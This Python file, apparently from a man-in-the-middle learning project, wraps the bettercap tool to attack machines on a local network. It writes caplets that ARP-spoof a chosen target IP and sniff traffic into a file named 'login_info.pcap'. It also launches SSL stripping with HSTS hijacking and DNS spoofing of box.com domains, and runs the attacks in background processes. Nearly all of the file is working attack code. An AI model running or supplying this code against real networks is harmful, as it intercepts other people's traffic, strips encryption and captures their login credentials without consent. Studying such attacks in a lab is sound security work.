import subprocess
import time, os
from multiprocessing import Process
from ipware import get_client_ip

FILE_PATH = os.path.dirname(os.path.abspath(__file__)) + "/bettercap_file/arpspoof.cap"

def sslstrip(interface):
    print("[+] sslstrip attack start... interface: " + interface)
    subprocess.run(["bettercap", "-iface", interface, "-caplet", FILE_PATH, "-eval", "'hstshijack/hstshijack'"])

def dns_spoof(interface):
    print("[+] dns spoof attack start... interface: " + interface)
    subprocess.run(["bettercap", "-iface", interface, "-caplet", FILE_PATH])

def stop_attack():
    # subprocess.run(["pgrep", "-f", "bettercap", "|", "xargs", "kill", "-INT"])
    p1 = subprocess.Popen(["pgrep", "-f", "bettercap"], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(["xargs", "kill", "-INT"], stdin=p1.stdout, stdout=subprocess.PIPE)
    p1.stdout.close()
    print("\n!!!!!complete!!!!!\n")

# # ディレクトリ取得
# def get_dir():
#     # subprocess.run(["pwd"]) # /root/Documents/mitmproject/mitmlearning/mitm
#     return os.path.dirname(os.path.abspath(__file__))

def change_spoof_file(ip):
    lines = [
        "net.probe on\n",
        "set arp.spoof.fullduplex true\n",
        "set arp.spoof.targets " + ip +"\n",
        "arp.spoof on\n",
        "set net.sniff.local true\n",
        "set net.sniff.output login_info.pcap\n",
        "net.sniff on\n"
    ]
    result = ""
    with open(FILE_PATH, "w") as f:
        f.writelines(lines)
    with open(FILE_PATH, "r") as f:
        result = f.read()
    return result

def change_dns_spoof_file(ip):
    lines = [
        "net.probe on\n",
        "set arp.spoof.fullduplex true\n",
        "set arp.spoof.targets " + ip +"\n",
        "arp.spoof on\n",
        "set net.sniff.local true\n",
        "set net.sniff.output login_info.pcap\n",
        "net.sniff on\n",
        "set dns.spoof.all true\n",
        "set dns.spoof.domains box.com,*.box.com\n",
        "dns.spoof on\n",
    ]
    result = ""
    with open(FILE_PATH, "w") as f:
        f.writelines(lines)
    with open(FILE_PATH, "r") as f:
        result = f.read()
    return result

def sslstrip_around(ip):
    change_spoof_file(ip)
    # sslstrip("wlp2s0")
    p = Process(target=sslstrip, args=("wlp2s0",))
    p.start()

def dns_spoof_around(ip):
    change_dns_spoof_file(ip)
    # dns_spoof("wlp2s0")
    p = Process(target=dns_spoof, args=("wlp2s0",))
    p.start()

# sslstrip("eth0")
# time.sleep(1)
# stop_attack()
